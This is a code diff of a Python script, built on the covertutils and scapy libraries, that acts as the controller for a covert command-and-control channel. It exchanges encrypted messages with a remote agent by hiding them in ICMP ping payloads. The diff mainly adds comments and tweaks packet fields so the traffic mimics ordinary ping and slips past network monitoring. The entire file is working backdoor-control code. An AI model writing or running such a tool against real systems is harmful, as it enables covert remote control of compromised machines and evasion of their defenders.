@@ -1,108 +1,118 @@
 #!/usr/bin/env python
+#============================== Imports part =============================
+
 from covertutils.handlers import ResponseOnlyHandler
 from covertutils.orchestration import SimpleOrchestrator
 from covertutils.prompts import TextPrompt
 
-from scapy.all import sniff, IP, ICMP, Raw
-from scapy.all import send as scapy_send
+from scapy.all import sniff, IP, ICMP, Raw		# Never bloat scapy import with *
+from scapy.all import send as scapy_send	# unexpected things will happen
 
-from threading import Thread
-from time import sleep
+from threading import Thread		# Need a thread for running a sniffer
+from time import sleep			# I spin lock a lot
 
-from random import randint
-from struct import pack
-import time
+from random import randint		# Generating ICMP and IP id fields needs randomness
+from struct import pack			# packing a unixtime in Pings is key
+import time						# used for unixtime
 
-import sys
-
-
-agent_address = sys.argv[1]
-passphrase = sys.argv[2]
-delay_secs = float(sys.argv[3])
-passphrase = "pass"
+import sys						# Used for arguments
 
 
-icmp_packets = []
-icmp_seq = 1
+agent_address = sys.argv[1]		# Where the Agent resides (aka RHOST)
+passphrase = sys.argv[2]		# What is the passphrase the agent uses
+delay_secs = float(sys.argv[3])	# Delay between Pings sent. 1 sec is slow but realistic
+
 
 #============================== Networking part ===========================
-# The networking is handled by Python API. No 'covertutils' code here...
+# The networking is handled by Python and Scapy. No 'covertutils' code here...
 
-def add_icmp_packet( pkt ) :
+icmp_packets = []		# Packets captured by sniffer will be stored here
+icmp_seq = 1		# The initial Ping sequence value is 1/256
+icmp_id = randint( 0, 65535 )	# The sequence value is the same on every packet for every execution of 'ping'
+
+
+def add_icmp_packet( pkt ) :	# wrapper function to add a packet to the list
 	global icmp_packets
 	icmp_packets.append( pkt )
 
 
-def collect_icmp() :
-	sniff( filter = "icmp[icmptype] == icmp-echoreply", prn = add_icmp_packet )
+def collect_icmp() :		# Scappy non terminating sniffer
+	cap_filter = "icmp[icmptype] == icmp-echoreply"		# that captures echo replies
+	sniff( filter = cap_filter, prn = add_icmp_packet )	 # runs forever
 
 
-def get_icmp_timestamp( ) :
+def get_icmp_timestamp( ) :		# function returns UNIX time in 4 bytes Little Endian
 	return pack("<I", int(time.time()))
 
 
-def recv( ) :
-	global ip_to_sent
-	while not icmp_packets :
+def recv( ) :		# Networking Wrapper function needed for the handler
+	while not icmp_packets :	# Blocks when no packet is available
 		sleep(0.01)
 
-	pkt = icmp_packets.pop(0)
-	ret = str(pkt[Raw])[4:]			# remove the timestamp
-	return ret
+	pkt = icmp_packets.pop(0)	# Get the first packet
+	raw_data = str(pkt[Raw])[4:]		# Remove the UNIX timestamp
+	return raw_data		# Return the raw data to Handler
 
 
-def send( raw_data ) :
-	sleep( delay_secs )
-	icmp_id = randint( 0, 65535 )
-	ip_id = randint( 0, 65535 )
-	pkt = IP( dst = agent_address, id = ip_id )/ICMP( type = "echo-request", id = icmp_id, seq = icmp_seq )/Raw( get_icmp_timestamp() + raw_data )
-	scapy_send( pkt, verbose = False )
+def send( raw_data ) :	# Networking Wrapper function needed for the handler
+	sleep( delay_secs )		# Delay before next Ping
+	ip_id = randint( 0, 65535 )	# Calculate random header values to simulate real packets
+	payload = get_icmp_timestamp() + raw_data	# the payload starts with UNIX time to simulate real ping
+	pkt = IP( dst = agent_address, id = ip_id, flags = 'DF' )/ICMP( type = "echo-request", id = icmp_id, seq = icmp_seq )/Raw( payload )
+	scapy_send( pkt, verbose = False )		# Make and send a Raw Packet
 
 
 sniff_thread = Thread( target = collect_icmp )
 sniff_thread.daemon = True
-sniff_thread.start()
+sniff_thread.start()			# Run the ICMP reply collector in a thread
 #==========================================================================
 
 
 #============================== Handler Overriding part ===================
 
-
+#	ResponseOnlyHandler because the Agent never sends packet adHoc but only as responses
+#		(Except if we use adHocSend() by hand - later in Prompt creation)
 class Handler( ResponseOnlyHandler ) :
 
-	def onMessage( self, stream, message ) :
-		print
-		print message
-		global icmp_seq
+	def onMessage( self, stream, message ) :	# When a Message arrives
+		print				# make a linefeed
+		print message		# Print it!
+		global icmp_seq		# Make the Ping Sequence Number 1/256 again
 		icmp_seq = 1
-		# super( Handler, self ).onMessage( stream, message )
+		global icmp_id		# Simulate a new 'ping' execution
+		icmp_id = randint( 0, 65535 )
 
 
-	def onChunk( self, stream, message ) :
+	def onChunk( self, stream, message ) :	# When a Chunk arrives
 		# print "[+] Got a Chunk"
 		global icmp_seq
-		if not message :	# Got a message part
-			# print "Sent response"
-			icmp_seq += 1
-			self.queueSend( self.request_data, stream )
-			super( Handler, self ).onMessage( stream, self.request_data  )
-		# self.onMessage( stream, self.request_data )
+		if not message :	# If it is not a complete message (but a part of one)
+			icmp_seq += 1	# add one to the ICMP sequence
+			self.queueSend( self.request_data, stream )	# Add a message to the send queue
+			super( Handler, self ).onMessage( stream, self.request_data  )	# Run the ResponseOnlyHandler onMessage
+			# That automatically responds with the next Message in queue when called. (Always responding to messages behavior)
 
 
-
-	def onNotRecognised( self ) :
+	def onNotRecognised( self ) :	# When Junk arrives
 		# print "[!] Unrecognised"
-		pass
+		pass			# Do nothing
+
 #==========================================================================
 
 
 
 #=============================Handler Creation=============================
 
-orchestrator = SimpleOrchestrator( passphrase, tag_length = 2, out_length = 52, in_length = 52, reverse = True )
+orchestrator = SimpleOrchestrator( passphrase,	# Encryption keys generated from the passphrase
+				tag_length = 2,		# The tag length in bytes
+				out_length = 52,	# The absolute output byte length (with tags)
+				in_length = 52,		# The absolute input byte length (with tags)
+				streams = ['main'],	# Stream 'control' will be automatically added as failsafe mechanism
+				reverse = True )	# Reverse the encryption channels - Agent has `reverse = False`
 
-handler = Handler( recv, send, orchestrator )
-handler.preferred_send = handler.sendAdHoc
+handler = Handler( recv, send, orchestrator )	# Instantiate the Handler object. Finally!
+handler.preferred_send = handler.sendAdHoc	# Change the preferred method to use it with the prompt.
+# This way the prompt will iterate a message sending and the ResponseOnlyHandler will do the ping-pong
 
 #==========================================================================
 
